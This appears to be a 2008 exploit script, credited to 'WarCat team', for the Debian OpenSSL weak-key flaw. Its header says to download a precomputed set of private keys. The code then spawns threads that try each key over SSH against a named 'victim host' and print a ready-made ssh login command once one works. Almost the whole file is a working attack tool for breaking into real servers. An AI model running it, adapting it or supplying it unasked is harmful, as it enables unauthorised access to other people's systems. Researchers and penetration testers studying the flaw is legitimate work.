#!/bin/python
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.
############################################################################
# Autor: hitz - WarCat team (warcat.no-ip.org)
# Collaborator: pretoriano
#
# 1. Download https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
#
# 2. Extract it to a directory
#
# 3. Execute the python script
#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
#     - execute: python exploit.py (without parameters) to display the help
#     - if the key is found, the script shows something like that:
#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
#		  Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
############################################################################


import Queue
import os
import string
import time
from threading import Thread
import sys

#This class only has a boolean, which will be True if some thread find the key
class End():
	def __init__(self):
		self.end = False
		
	def Finish(self):
		self.end = True
	
	def GetEnd(self):
		return self.end	
		

#This is the thread class
class Connection(Thread):
	def __init__(self,QueueDir,TheEnd,dir,host,user,port='22'):
		Thread.__init__(self)
		self.QueueDir = QueueDir
		self.TheEnd = TheEnd
		self.dir = dir
		self.host = host
		self.user = user
		self.port = port
			
	def run(self):
		while (not self.TheEnd.GetEnd()) and (not self.QueueDir.empty()):
			key = self.QueueDir.get()
			
			cmd = 'ssh -l ' + self.user 
			cmd = cmd + ' -p ' + self.port 
			cmd = cmd + ' -o PasswordAuthentication=no'
			cmd = cmd + ' -i ' + self.dir + '/' + key 
			cmd = cmd + ' ' + self.host + ' exit; echo $?'
			
			pin,pout,perr = os.popen3(cmd, 'r')
			pin.close()
			
			#To debug descoment the next line. This will show the errors reported by ssh
			#print perr.read()
			
			if pout.read().lstrip().rstrip() == '0':
				self.TheEnd.Finish()
				print ''
				print 'Key Found in file: '+ key
				print 'Execute: ssh -l%s -p%s -i %s/%s %s' %(self.user,self.port,self.dir,key,self.host) 
				print ''
		
print '\n-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org' 

if len(sys.argv) < 4:
	print './exploit.py <dir> <host> <user> [[port] [threads]]'
	print '    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash'
	print '    <host>: The victim host'
	print '    <user>: The user of the victim host'	
	print '    [port]: The SSH port of the victim host (default 22)'
	print '    [threads]: Number of threads (default 4) Too big numer is bad'
	
	sys.exit(1)
	
dir = sys.argv[1]
host = sys.argv[2]
user = sys.argv[3]

if len(sys.argv) <= 4: 
	  port='22'
	  threads=4
else:
	if len(sys.argv) <=5:
		port=sys.argv[4]
		threads = 4

	else:
		port=sys.argv[4]	
		threads = sys.argv[5]

ListDir = os.listdir(dir)
QueueDir=Queue.Queue()
TheEnd = End()

for i in range(len(ListDir)):
	if ListDir[i].find('.pub') == -1:	
		QueueDir.put(ListDir[i])

initsize = QueueDir.qsize()
tested = 0

for i in range(0,int(threads)):
	Connection(QueueDir,TheEnd,dir,host,user,port).start()


while (not TheEnd.GetEnd()) and (not QueueDir.empty()):
	time.sleep(5)
	actsize = QueueDir.qsize()
	speed = (initsize - tested - actsize)/5
	tested = initsize - actsize
	
	print 'Tested %i keys | Remaining %i keys | Aprox. Speed %i/sec' %(tested,actsize,speed) 

# milw0rm.com [2008-06-01]